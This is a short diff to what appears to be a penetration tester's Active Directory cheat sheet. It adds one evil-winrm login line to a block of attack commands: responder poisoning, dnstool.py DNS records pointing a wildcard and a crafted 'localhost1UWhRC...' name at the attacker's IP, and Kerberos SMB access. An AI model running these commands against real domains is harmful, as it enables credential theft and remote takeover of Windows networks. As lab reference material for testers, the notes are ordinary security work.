@@ -228,6 +228,7 @@ sudo responder -I tun0 -v
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
+evil-winrm -i $TARGET -u $USERNAME -p $PASSWORD
 evil-winrm -i $DC -r $DOM
 
 ## Set Administrator Account
